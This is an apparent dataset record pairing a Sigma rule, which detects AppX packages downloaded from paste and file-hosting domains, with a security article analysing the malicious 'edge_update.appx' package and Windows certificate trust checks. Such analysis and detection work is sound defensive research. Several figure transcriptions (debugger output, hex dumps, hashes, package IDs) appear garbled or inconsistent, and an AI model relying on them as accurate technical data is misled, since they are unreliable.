content of *AppxManifest.xml* in *edge_update.appx* (trimmed for brevity)\nDescription: The image displays the content of the `AppxManifest.xml` file from the malicious `edge_update.appx` package. It includes XML code detailing the identity of the application, which is signed by Foresee Consulting Inc. The display name of the app is 'Edge Update', and it outlines several properties such as publisher information, version details, and resource requirements. Additionally, it highlights the app's capabilities, specifically 'internetClient' and 'runFullTrust', indicating that the application can access the internet and has full trust permissions within the Windows environment.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"utf-8\"?>\n  <Package xmlns=\"http://schemas.microsoft.com/appx/manifest/foundation/windows10\">\n    <Identity Name=\"3669e262-ec02-4e9d-bcbd-3d088b4afac9\" Publisher=\"CN=Foresee Consulting Inc., L=North York, S=Ontario, C=CA, SERIALNUMBER=1040913-1, OID.1.3.6.1.4.1.311.60.2.1.3=CA, OID.2.5.4.15=Private Organization\" Version=\"96.0.1072.0\" ProcessorArchitecture=\"neutral\" />\n    <Properties>\n      <DisplayName>Edge Update</DisplayName>\n      <PublisherDisplayName>Microsoft Inc</PublisherDisplayName>\n      <Logo>Images\\StoreLogo.png</Logo>\n    </Properties>\n    <Dependencies>\n      <TargetDeviceFamily Name=\"Windows.Universal\" MinVersion=\"10.0.14393.0\" MaxVersionTested=\"10.0.19041.0\" />\n      <TargetDeviceFamily Name=\"Windows.Desktop\" MinVersion=\"10.0.14393.0\" MaxVersionTested=\"10.0.19041.0\" />\n    </Dependencies>\n    <Resources>\n      <Resource Language=\"EN-US\" />\n    </Resources>\n    <Applications>\n      <Application Id=\"App\" Executable=\"eediwjus.exe\" EntryPoint=\"Windows.FullTrustApplication\">\n        <uap:SplashScreen Image=\"Images\\SplashScreen.png\" />\n        <uap:LockScreen BadgeLogo=\"Images\\BadgeLogo.png\" Notification=\"badgeAndTileText\" />\n      </Application>\n    </Applications>\n    <Capabilities>\n      <Capability Name=\"internetClient\" />\n      <rescap:Capability Name=\"runFullTrust\" />\n    </Capabilities>\n  </Package>\n```\n\n`AppxBlockMap.xml` is the package block map, a file in XML format that stores Base-64 encoded hash values of data blocks in the files that an *APPX* package archives. Windows uses these hashes to verify the data integrity of these files when installing an *APPX* package, a topic that I discuss further in this article.\n\nFigure 6 depicts the content of `AppxBlockMap.xml` in the malicious `edge_update.appx`. The `HashMethod` XML attribute specifies the hash algorithm for calculating the data block hash values in `AppxBlockMap.xml`. The `File` XML element specifies a file in the *APPX* package and the size of the file. The `Block` XML element specifies the hash value and the size of a single data block in the file. For example, a data block in `eediwjus.exe` that is 1304 bytes big has the SHA-256 hash value of *ad4f74c0c3ac37e6f1cf600a96ae203c38341d263dbac0741e602686794c4f5a* (in hexadecimal format).\n\n```image\nAlt: Figure 6: The content of *AppxBlockMap.xml* in *edge_update.appx* (trimmed for brevity)\nDescription: The image displays an XML structure representing the content of an *AppxBlockMap.xml* file from a malicious APPX package named `edge_update.appx`. It includes elements such as `HashMethod`, which specifies the hash algorithm used, and multiple `File` elements detailing individual files within the package. Each `File` entry lists attributes such as `File Name`, `Size`, and a corresponding `Block Hash`, which provides the SHA-256 hash of specific data blocks in the file.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n  <BlockMap xmlns=\"http://schemas.microsoft.com/appx/2010/blockmap\" HashMethod=\"http://www.w3.org/2001/04/xmlenc#sha256\">\n    <File Name=\"eediwjus\\eediwjus.exe\" Size=\"3584\" LfhSize=\"51\">\n      <Block Hash=\"ru90WOsNh+bz2AK2lq4gPDg8H5YusB0HmAmhnIM1Io=\" Size=\"1304\"/>\n    </File>\n    <File Name=\"eediwjus\\eediwjus.dll\" Size=\"5632\" LfhSize=\"51\">\n      <Block Hash=\"9C0gbarmyAq2IwgfMgfef+MUu1Up14eJ3YarNeRsY=\" Size=\"4280\"/>\n    </File>\n    <File Name=\"resources.pri\" Size=\"2216\" LfhSize=\"43\"/>\n    <File Name=\"AppxManifest.xml\" Size=\"2039\" LfhSize=\"46\">\n      <Block Hash=\"kMExXuwujmFwXpesPEI17NjZsArZfVULhB9=\" Size=\"902\"/>\n    </File>\n  </BlockMap>\n```\n\n`AppxSignature.p7x` is the *APPX* package signature, a PKCS (Public-Key Cryptography Standards) #7 digital signature data in ASN.1 (Abstract Syntax Notation One) format. `AppxSignature.p7x` stores signature data, such as the certificate chain of the digital signature and the actual signed data. The signed data includes hashes of files in the APPX package, such as `AppxManifest.xml` and `AppxBlockMap.xml`. Figure 7 depicts the formatted content of `AppxSignature.p7x` in the malicious `edge_update.appx`.\n\n```image\nAlt: Figure 7: The content of *AppxSignature.p7x* in *edge_update.appx* (trimmed for brevity)\nDescription: The image shows the structured content of a digital signature in ASN.1 format, specifically detailing the certificate chain related to the `edge_update.appx` APPX package. It includes sequences with object identifiers for various components such as the signature algorithm (SHA-256), the signing context for Microsoft code signing, and the common names of the involved entities: DigiCert Trusted Root G4 and Foresee Consulting Inc. This representation is crucial for understanding the security validations tied to the digital signature of malicious Windows applications.\nTranscription: |\n  SEQUENCE (2 elem)\n      OBJECT IDENTIFIER 1.2.840.113549.1.7.2 signedData (PKCS #7)\n      [0] (0 elem)\n  SEQUENCE (5 elem)\n      INTEGER 1\n      SET (1 elem)\n          SEQUENCE (2 elem)\n              OBJECT IDENTIFIER 2.16.840.1.101.3.4.2.1 sha-256 (NIST Algorithm)\n              NULL\n      SEQUENCE (2 elem)\n          OBJECT IDENTIFIER 1.3.6.1.4.1.311.2.1.4 spcIndirectDataContext (Microsoft code signing)\n          [0] (1 elem)\n              OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString DigiCert Trusted Root G4\n          [...]\n          OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1\n          [...]\n          OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString Foresee Consulting Inc.\n```\n\n## Is a Malicious Windows App Trustworthy?\n\nThe `AppxSvc` service (`Appx Deployment Service`), which the DLL (dynamic-link library) `%SystemRoot%\\System32\\appxdeploymentserver.dll` implements, orchestrates the installation of *APPX* packages. When a user installs an *APPX* package, the `AppxSvc` service verifies the data integrity of the package and verifies that the package satisfies certain trust criteria. Figure 8 depicts a simplified overview of the data integrity verification process that the `AppxSvc` service conducts.\n\n```image\nAlt: Figure 8: A simplified overview of the data integrity verification process that the *AppxSvc* service conducts\nDescription: The image is a flowchart depicting the data integrity verification process conducted by the `AppxSvc` service when installing an *APPX* package. It outlines the steps involved in verifying the package signature (`AppxSignature.p7x`), the verification of `AppxBlockMap.xml`, and the subsequent verification of data blocks specified by `AppxBlockMap.xml`. The flowchart indicates decision points where the process can either continue or terminate based on whether each verification step is successful.\nTranscription: |\n  AppxSvc verifies the package signature AppxSignature.p7x\n      ├── Verified?\n      │   ├── No\n      │   │   └── AppxSvc terminates the package installation\n      │   └── Yes\n      │       └── AppxSvc verifies AppxBlockMap.xml\n      │           ├── Verified?\n      │           │   ├── No\n      │           │   │   └── AppxSvc terminates the package installation\n      │           │   └── Yes\n      │           │       └── AppxSvc verifies the data blocks that AppxBlockMap.xml specifies\n      │           │           ├── Verified?\n      │           │           │   ├── No\n      │           │           │   │   └── AppxSvc terminates the package installation\n      │           │           │   └── Yes\n      │           │           │       └── AppxSvc continues the package installation\n```\n\nIn summary, the data integrity verification process consists of the following steps:\n\n1. The `AppxSvc` service invokes the *WinVerifyTrust* function to verify the *APPX* package signature `AppxSignature.p7x`, that is, to verify the signed data in `AppxSignature.p7x` using the certificate chain in `AppxSignature.p7x` (see Figure 7). The signed data includes hashes of files that the *APPX* package stores, including `AppxBlockMap.xml` (see Figure 6). For example, Figure 9 depicts the hash value of `AppxBlockMap.xml` in the malicious `edge_update.appx` and the same value in `AppxSignature.p7x`, the package signature of `edge_update.appx`.\n\n   ```image\n   Alt: Figure 9: The hash value of *AppxBlockMap.xml* in the package signature of *edge_update.appx*\n   Description: The image is a screenshot of a command-line interface displaying the SHA-256 hash value of a file named 'AppxBlockMap.xml'. The command executed is 'Get-FileHash', which computes the hash of the specified file. The output shows the algorithm used (SHA256) and the corresponding hash value: '025C22C3EAD2720DA646FEA322EEBEC95B5B1CD1D0991850FFD28C7890F157C9'. This screenshot is relevant to the context of validating data integrity for malicious Windows apps, specifically in relation to the data integrity verification process involving the AppxSvc service.\n   Transcription: |\n     PS C:\\Users\\<user>\\Desktop\\malicious_appx\\malicious_appx> Get-FileHash .\\AppxBlockMap.xml\n     Algorithm Hash\n     --------- ----\n     SHA256  025C22C3EAD2720DA646FEA322EEBEC95B5B1CD1D0991850FFD28C7890F157C9\n   ```\n\n2. The successful verification of the signed data in `AppxSignature.p7x` enables the `AppxSvc` service to verify the data integrity of the files whose hashes are part of the signed data, including `AppxBlockMap.xml`. The `AppxSvc` service does this by first computing the SHA-256 hash value of `AppxBlockMap.xml` and then comparing the computed value with the SHA-256 hash value of `AppxBlockMap.xml` in the previously verified signed data.\n\n3. Once the `AppxSvc` service verifies the data integrity of `AppxBlockMap.xml`, the service verifies the integrity of the data blocks that `AppxBlockMap.xml` specifies (see Figure 6). The service does this by first computing the hash values of the data blocks and then comparing the computed values with the Base-64 encoded hash values in `AppxBlockMap.xml`.\n\nThe steps above ensure that the data in an *APPX* package is credible, with the overall process relying on a successful verification of the signed data in `AppxSignature.p7x`. However, for Windows to install an *APPX* package, also a malicious package, the system also has to verify that the package satisfies a set of trust criteria.\n\nPrevious research provides more background information on the steps above. This article focuses on the trust criteria that relate to the certificates in `AppxSignature.p7x` that the `AppxSvc` service uses to verify the signed data in `AppxSignature.p7x`.\n\nThese certificates represent the root of trust for the data integrity verification of an *APPX* package and for establishing trust in the package. In addition, in contrast to other *APPX* package-internal data structures for data integrity and trust verification, the certificates are more relevant entities from an operational perspective to end-users.\n\nWhen the `AppxSvc` service installs the malicious `edge_update.appx`, the service executes:\n\n- The *CertVerifyCertificateChainPolicy* function to validate the certificates in `AppxSignature.p7x` against the following certificate validation policies: *CERT_CHAIN_POLICY_AUTHENTICODE* (2), *CERT_CHAIN_POLICY_AUTHENTICODE_TS* (3), *CERT_CHAIN_POLICY_BASE* (1), and *CERT_CHAIN_POLICY_BASIC_CONSTRAINTS* (5). Among other certificate properties, `CertVerifyCertificateChainPolicy` validates whether the certificates are valid for code signing and whether the root certificate is trusted – present in a certificate store for trusted root certificates, such as *Trusted Root Certification Authorities*.\n- The *CertGetCertificateChain* function to check the revocation status of the certificates in `AppxSignature.p7x`.\n\nIf any validation by `CertVerifyCertificateChainPolicy` or `CertGetCertificateChain` fails, the `AppxSvc` service does not establish trust in the *APPX* package and terminates the installation of `edge_update.appx`.\n\nTo demonstrate a failed validation by `CertVerifyCertificateChainPolicy`, Figure 10 depicts a scenario that I crafted: The `AppxSvc` service executes `CertVerifyCertificateChainPolicy` to validate the certificates in the package signature of `edge_update.appx` against the *CERT_CHAIN_POLICY_AUTHENTICODE* (2) and *CERT_CHAIN_POLICY_BASE* (1) certificate validation policies. The *CERT_CHAIN_POLICY_BASE* policy fails the validation of the certificates due to an untrusted root certificate – the root certificate issued by DigiCert Trusted Root G4 is not present in a certificate store for trusted root certificates. This causes the `AppxSvc` service to terminate the installation of `edge_update.appx`.\n\n```image\nAlt: Figure 10: *CertVerifyCertificateChainPolicy* fails the validation of the certificates in the package signature of *edge_update.appx* due to an untrusted root certificate\nDescription: The image depicts a debugger output showing a breakpoint hit in the `CertVerifyCertificateChainPolicy` function from the Windows `CRYPT32` library. It displays the memory address and instruction being executed, along with the value of the register `rcx` at two different points. The values of `rcx` indicate the status or result of the operation, which is often used in debugging to trace the execution flow and validate the correctness of cryptographic operations related to certificate verification.\nTranscription: |\n  Breakpoint 0 hit\n  CRYPT32!CertVerifyCertificateChainPolicy:\n  00007ffb`34485560 4c8bdc        mov     r11,rsp\n  00007ffb`34485563 488bce        mov     rcx,rdx\n  00007ffb`34485566 488bda        mov     rbx,rdx\n  00007ffb`34485569 488bcb        mov     rcx,r11\n  00007ffb`3448556c 488bce        mov     rcx,rdx\n  00007ffb`3448556f 488bda        mov     rbx,rdx\n  00007ffb`34485572 488bcb        mov     rcx,r11\n  00007ffb`34485575 488bce        mov     rcx,rdx\n  00007ffb`34485578 488bda        mov     rbx,rdx\n  00007ffb`3448557b 488bcb        mov     rcx,r11\n  00007ffb`3448557e 488bce        mov     rcx,rdx\n  00007ffb`34485581 488bda        mov     rbx,rdx\n  00007ffb`34485584 488bcb        mov     rcx,r11\n  rcx=00000000000000002\n  00007ffb`34485587 488bce        mov     rcx,rdx\n  00007ffb`3448558a 488bda        mov     rbx,rdx\n  00007ffb`3448558d 488bcb        mov     rcx,r11\n  00007ffb`34485590 488bce        mov     rcx,rdx\n  00007ffb`34485593 488bda        mov     rbx,rdx\n  00007ffb`34485596 488bcb        mov     rcx,r11\n  00007ffb`34485599 488bce        mov     rcx,rdx\n  00007ffb`3448559c 488bda        mov     rbx,rdx\n  00007ffb`3448559f 488bcb        mov     rcx,r11\n  rcx=00000000000000001\n```\n\nIn practice, `CertVerifyCertificateChainPolicy` successfully validates the certificates in the package signature of the malicious `edge_update.appx`. This is because the root certificate, which is issued by DigiCert Trusted Root G4, is present in the *Trusted Root Certification Authorities* certificate store.\n\n## Revoked, or Not, That is the Question\n\nThe `AppxSvc` service executes the `CertGetCertificateChain` function to check the revocation status of the certificates in the package signature of `edge_update.appx`, starting from the end certificate in the certificate chain – the one issued to Foresee Consulting Inc. (see Figure 11).\n\n```image\nAlt: Figure 11: The certificate issued to Foresee Consulting Inc. in the context of the *CertGetCertificateChain* function (in ASN.1 format)\nDescription: The image presents a hexadecimal and ASCII dump of a file, likely related to a certificate or digital signature. The dump includes addresses, hexadecimal values, and their corresponding ASCII representations. It appears to contain details about a certificate associated with Foresee Consulting Inc., as indicated by the text within the ASCII section. This information is relevant to the analysis of the certificate chain and its potential revocation status in the context of malicious Windows applications.\nTranscription: |\n  0:083: db 00000246' cdbe9ad8 L0x7e8\n  00000246' cdbe9ad0 30 82 07 e4 82 01 0a 82 00 00 00 00 00 00 00 00\n  00000246' cdbe9ae0 c0 f1 8d a3 e2 e3 00 01 02 01 0e 10 0b 00 00\n  00000246' cdbe9af0 0d ed 09 2a 86 48 86 f7 0d 01 01 01 0b 00 00\n  00000246' cdbe9b00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  00000246' cdbe9b10 15 03 65 04 53 00 01 01 01 0a 01 01 01 0b 00\n  00000246' cdbe9b20 30 49 30 47 06 09 2a 86 48 86 f7 0d 01 01 01\n  00000246' cdbe9b30 0c 01 01 01 0b 00 00 00 00 00 00 00 00 00\n  00000246' cdbe9b40 20 47 47 2a 64 64 64 64 64 64 64 64 64 64 64\n  00000246' cdbe9b50 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b60 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b70 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b80 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9b90 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9ba0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bb0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bc0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bd0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9be0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9bf0 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32\n  00000246' cdbe9c00 0a 13 17 46 67 72 73 65 73 66 65 67 66 67 67\n  00000246' cdbe9c10 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c20 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c30 72 69 67 69 67 69 67 69 67 69 67 69 67 69 67\n  00000246' cdbe9c40 04 81 ad 38 81 aa 53 a0 51 a0 48 46 86 4d 68\n  00000246' cdbe9f20 74 0a 3a 2f 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e 2e\n  00000246' cdbe9f30 72 74 2e 66 2f 64 64 64 64 64 64 64 64 64 64\n  00000246' cdbe9f40 72 72 67 67 67 67 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f50 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f60 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f70 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f80 60 66 67 65 72 72 67 67 67 67 67 67 67 67 67\n  00000246' cdbe9f90 48 41 73 67 67 67 67 67 67 67 67 67 67 67 67\n```\n\n`AppxSvc` executes `CertGetCertificateChain` such that the function verifies the revocation status of all certificates in the certificate chain, including the root certificate – the `dwFlags` parameter of `CertGetCertificateChain` has the value of **0x20000000** (*CERT_CHAIN_REVOCATION_CHECK_CHAIN*, see Figure 12).\n\n```image\nAlt: Figure 12: *CertGetCertificateChain* verifies the revocation status of all certificates in the certificate chain\nDescription: The image shows a debugger output for the `CertGetCertificateChain` function from the CRYPT32 library. It highlights a breakpoint where the function's execution has paused, displaying several memory addresses and values. Notably, the value '20000000' is emphasized, which corresponds to the `dwFlags` parameter used in the certificate chain verification process. This output is relevant as it provides technical details about the function's operation in the context of checking certificate revocation.\nTranscription: |\n  Breakpoint 3 hit\n  CRYPT32!CertGetCertificateChain:\n  00007ffb`6e9b4ae0 488bc4          mov     rax,rsp\n  [...]\n  0:008> dps @rsp\n  000000ab`68ffef58  46f6c19b appxdeploymentserver![...]\n  000000ab`68ffef60  00000000\n  000000ab`68ffef68  46fdc60a appxdeploymentserver![...]\n  000000ab`68ffef70  00000000\n  000000ab`68ffef78  00000000\n  000000ab`68ffef80  68ffefa0\n  000000ab`68ffef88  000000246`20000000\n```\n\nPrior to the revocation of the end certificate issued to Foresee Consulting Inc., `CertGetCertificateChain` did not indicate an issue with the certificate chain in the package signature of `edge_update.appx`. This resulted in the `AppxSvc` service completing the installation of the malicious *APPX* package and therefore compromising the system. Windows places installed Windows Apps in the `%ProgramFiles%\\WindowsApps` directory (see Figure 13).\n\n```image\nAlt: Figure 13: The *AppxSvc* service has completed the installation of the malicious *edge_update.appx*\nDescription: The image displays a file directory from the Windows operating system, specifically located under the 'Program Files\\WindowsApps' path. It shows a folder named 'eediwjus' containing two files: 'eediwjus.dll' (an application extension) and 'eediwjus' (an application), both modified on 07/07/2022 at 18:52. The file sizes are 6 KB for 'eediwjus.dll' and 4 KB for the 'eediwjus' application.\nTranscription: |\n  File: eediwjus\n  Location: Program Files\\WindowsApps\\3669e262-ec02-4e9d-bcb4-3d008b4afac9_96.0.1072.0_neutral_vgngsjmjd8sje\n  \n  Name            Date modified       Type                     Size\n  eediwjus.dll    07/07/2022 18:52    Application extension    6 KB\n  eediwjus        07/07/2022 18:52    Application              4 KB\n```\n\nAfter the revocation of the end certificate, `CertGetCertificateChain` indicates that a certificate in the package signature of `edge_update.appx` has been revoked by storing the *CERT_TRUST_IS_REVOKED* (**0x00000004**) error code in a *CERT_TRUST_STATUS* structure (see Figure 14). This results in the `AppxSvc` service terminating the installation of the malicious *APPX* package with an error (see Figure 15).\n\n```image\nAlt: Figure 14: *CertGetCertificateChain* stores the *CERT_TRUST_IS_REVOKED* (*0x00000004*) error code in a *CERT_TRUST_STATUS* structure\nDescription: The image displays a hexadecimal dump of a data segment, showing memory addresses and corresponding byte values. Notably, the value '04' is highlighted in the dump, likely indicating the presence of the *CERT_TRUST_IS_REVOKED* error code (0x00000004) relevant to the context of certificate revocation in the *CertGetCertificateChain* function. This representation is typically used in technical analysis for debugging or examining memory related to software behavior.\nTranscription: |\n  0:008> db 00000246`cb949c60\n  00000246`cb949c60  48 00 00 00 04 00 00 00  00 00 00 00 01 00 00 00  H..............\n  00000246`cb949c70  e0 9c 94 cb 46 02 00 00  00 00 00 00 00 00 00 00  ....F..........\n```\n\n```image\nAlt: Figure 15: The *AppxSvc* service terminates the installation of the malicious *edge_update.appx* with an error\nDescription: The image shows an error log from a command line interface indicating a failed attempt to deploy a malicious Windows app package (`malicious_appx.appx`). It details the error message, including an HRESULT code (0x800B010C) indicating that a certificate was explicitly revoked by its issuer. The log provides a command suggestion to check the Event Log for further details and includes the line of code attempting the app deployment, along with additional context about the error.\nTranscription: |\n  add-appxpackage : Deployment failed with HRESULT: 0x800B010C, A certificate was explicitly revoked by its issuer.\n  Deployment Add operation with target volume C: on Package 36096262-ec02-4e9d-bcb4-3d0884afa96_0.0.1072.0_neutral__vgnsgjmdj8sje from: (malicious_appx.appx) failed with error 0x800B010C. See http://go.microsoft.com/fwlink/?LinkId=235160 for help diagnosing app deployment issues.\n  NOTE: For additional information, look for [ActivityId] b3f723a8-91de-0000-4277-f7b3de91d801 in the Event Log or use the command line Get-AppPackageLog -ActivityID b3f723a8-91de-0000-4277-f7b3de91d801\n  At line:1 char:1\n  + add-appxpackage C:\\Users\\<user>\\Desktop\\malicious_appx\\malicious_appx ...\n  + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n      + CategoryInfo          : NotSpecified: (C:\\Users\\<user>\\...icious_appx.appx:String) [Add-AppxPackage], Exception\n      + FullyQualifiedErrorId : DeploymentError,Microsoft.Windows.Appx.PackageManager.Commands.AddAppxPackageCommand\n```\n\n## Recommendations for Users and Administrators\n\nFor Windows to install a Windows App that is packaged, for example, into an *APPX* package, the system first has to establish trust in the package. To this end, Windows verifies the data integrity of the package based on the package signature and evaluates whether the package satisfies certain trust criteria. Some of the trust criteria that relate to the certificates in the package signature are the following:\n\n- If Windows App sideloading is not enabled on the system, the *APPX* package must originate from the Microsoft Store and be therefore counter-signed by Microsoft. App sideloading is not enabled by default on recent Windows versions. However, organizations may enable App sideloading on their managed devices or ask customers to turn App sideloading on in order to enable the deployment of Windows Apps built specifically for internal or customer use). These Windows Apps are known as LOB (line-of-business) Windows Apps.\n- If Windows App sideloading is enabled on the system, the *APPX* package must be signed such that:\n  - The system trusts the root certificate of the certificate chain in the signature – the certificate must be present in a certificate store for trusted root certificates.\n  - No certificate in the chain is revoked at package installation time.\n\nThe majority of the malicious *APPX* packages that the security community has observed as part of attacks have satisfied the criteria above.\n\nRecommendations for users and administrators for protecting against attacks that involve malware delivery via malicious Windows Apps include the following:\n\n- **For users:**\n  - Avoid downloading Windows Apps from the Microsoft Store without thoroughly examining relevant information, such as App vendor details, and number and quality of published user reviews. Be careful about typosquatting attempts – malicious Windows Apps with names that are very similar to legitimate, popular Windows Apps. Typosquatting is popular among malicious actors. Attackers have recently managed to plant malicious Windows Apps in the Microsoft Store. In addition, SentinelLabs has recently investigated typosquatting attacks against the crates.io Rust and the PyPI Python software repositories, referred to as CrateDepression and Pymafka.\n  - Stay vigilant against phishing attacks and avoid installing software and software updates from unknown sources. Malicious Windows Apps often come under the disguise of critical software updates.\n\n- **For administrators:** Malicious actors often use compromised legitimate code signing material, with end certificates that chain to trusted root certificates, to sign malicious Windows Apps. As this article shows, this enables the installation of the malicious App packages on victim systems. Therefore:\n  - Make sure that the systems under your management can timely and correctly verify whether a certificate has been revoked. This includes unrestricted access to CRL (Certificate Revocation List) and OCSP (Online Certificate Status Protocol) URLs, and/or up-to-date local CRL and OCSP caches. Certificate revocation is a crucial measure against the malicious Windows App threat.\n  - Make sure that the code signing material of your organization is kept secure. This is to prevent malicious actors from distributing malware masquerading as Windows Apps that originate from your organization.",
    "sigma_rule": {
      "title": "Suspicious Remote AppX Package Locations",
      "id": "8b48ad89-10d8-4382-a546-50588c410f0d",
      "status": "experimental",
      "description": "Detects an appx package added to the pipeline of the \"to be processed\" packages which was downloaded from a suspicious domain.\n",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "modified": "2024-08-22",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": 854,
          "Path|contains": [
            ".githubusercontent.com",
            "anonfiles.com",
            "cdn.discordapp.com",
            "ddns.net",
            "dl.dropboxusercontent.com",
            "ghostbin.co",
            "glitch.me",
            "gofile.io",
            "hastebin.com",
            "mediafire.com",
            "mega.nz",
            "onrender.com",
            "pages.dev",
            "paste.ee",
            "pastebin.com",
            "pastebin.pl",
            "pastetext.net",
            "privatlab.com",
            "privatlab.net",
            "send.exploit.in",
            "sendspace.com",
            "storage.googleapis.com",
            "storjshare.io",
            "supabase.co",
            "temp.sh",
            "transfer.sh",
            "trycloudflare.com",
            "ufile.io",
            "w3spaces.com",
            "workers.dev"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_susp_domains.yml",
    "id": "704"
  },
  {
    "url": "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
    "markdown": "# Inside Malicious Windows Apps for Malware Deployment\n\n**Date:** July 14, 2022\n\nThis article discusses Windows Apps – Windows applications packaged into *APPX* or *MSIX* packages – as a medium to deploy malware. Though not as widely abused as other infection vectors, there have been a number of recent high profile attacks that use Windows Apps.\n\n- **November, 2021:** BazarBackdoor was distributed in the form of an *APPX* package.\n- **December, 2021:** Emotet malware was distributed by abusing a spoofing vulnerability in the Windows App Installer, software that installs Windows Apps.\n- **January, 2022:** Malicious Windows Apps in *APPX* format masquerading as critical browser updates were used to drop Magniber ransomware.\n- **February, 2022:** Windows Apps laced with the Electron Bot malware were uploaded to the Microsoft Store, a trusted library of Microsoft-certified packaged Windows Apps.\n\nSince Microsoft’s announcement that Office applications will by default disable the execution of Office macros in the context of documents that originate from untrusted sources, there has been an uptick in malicious actors using alternative mediums for deploying malware such as Windows Apps and Windows shortcut *LNK* files. Despite Microsoft recently rolling back the decision to disable by default Office macro execution, these media complement malicious macros and remain a threat to watch for.\n\nPrevious research on malicious Windows Apps focused on concrete system infections involving particular instances of such Apps. This article complements previous research by taking a generic perspective. I take an *APPX* package that malicious actors have used to deploy malware as a running example and provide:\n\n- A summarizing overview of the layout and content of *APPX* packages (*APPX* packages are structurally very similar to the alternative *MSIX* packages and the two Windows App packaging formats share the same deployment infrastructure).\n- An overview of selected activities that the Windows system conducts when a user installs a malicious *APPX* package.\n\nThis enables a better understanding of what occurs on a system when a user falls prey to an attack that involves a malicious Windows App – from the operating system activities at first user interaction with the file to the malware deployment that the file triggers.\n\nFor Windows to install an *APPX* package, whether malicious or not, the system first has to establish trust in the package. Microsoft provides the Microsoft Store to Windows users as a library of certified packaged Windows Apps. These packages are digitally counter-signed by Microsoft. Windows trusts by default *APPX* packages that originate from the Windows Store. However, when the Windows App sideloading feature is enabled, users can install *APPX* packages that do not originate from the Microsoft Store as well, that is, packages that are not counter-signed by Microsoft. Such are the majority of the malicious *APPX* packages that the security community has observed in attacks.\n\nIn this article, we will dig into how malicious *APPX* packages can be installed on a Windows 10 system, with a focus on how Windows establishes trust in an *APPX* package. I focus on this aspect since trust is a crucial part of the Windows App installation process. This process is what ultimately deploys malware on a system. I will use the malicious *APPX* package *edge_update.appx* (SHA1: *e491af786b5ee3c57920b79460da351ccf8f6f6b*) as a running example.\n\n## What Does a Malicious Windows App Look Like?\n\nThe `edge_update.appx` *APPX* package is signed with a code signing certificate issued to Foresee Consulting Inc. and a root certificate issued by DigiCert Trusted Root G4. Windows systems trust DigiCert root certificates and they are placed in the *Trusted Root Certification Authorities* certificate store.\n\nFigure 1 depicts the certificate chain of the digital signature of `edge_update.appx` before a Certificate Authority revoked the certificate.\n\n```image\nAlt: Figure 1: The certificate chain of the digital signature of *edge_update.appx* prior certificate revocation\nDescription: The image displays a certificate verification path for a digital signature. It shows the hierarchy of the certificate chain, starting from the root certificate 'DigiCert Trusted Root G4,' followed by a code signing certificate issued to 'Foresee Consulting Inc.' The path indicates that the digital signature is authenticated up to a trusted root authority, which is relevant for understanding the trustworthiness of the malicious Windows app discussed in the surrounding text.\nTranscription: |\n  Certificate\n  \n  General\n  Details\n  Certification Path\n  \n  Certification path\n  - DigiCert Trusted Root G4\n    - DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1\n      - Foresee Consulting Inc.\n```\n\n*APPX* packages are ZIP archive files that store the executable files that implement the packaged Windows App and additional files. Figure 2 depicts the content of `edge_update.appx`. The `eediwjus` directory stores the malicious Windows App that the executable files `eediwjus.exe` and `eediwjus.dll` implement. `eediwjus.exe` is a .NET Windows App (see Figure 3) that invokes the `mhjpfzvitta` function from `eediwjus.dll`. This function executes malicious code that is heavily control-flow obfuscated with unconditional jumps (see Figure 4). The analysis of the malicious code is out of the scope of this article.\n\n```image\nAlt: Figure 2: The content of *edge_update.appx*\nDescription: The image displays a directory listing of files within a malicious APPX package, specifically located in the path `C:\\Users\\<user>\\malicious_appx\\`. It shows the file names, their sizes, and timestamps of last modifications. The top section lists general files associated with the APPX package, including `AppxBlockMap.xml`, `AppxManifest.xml`, and `AppxSignature.p7x`, along with the malicious directory `eediwjus`. The bottom section provides a detailed view of the `eediwjus` 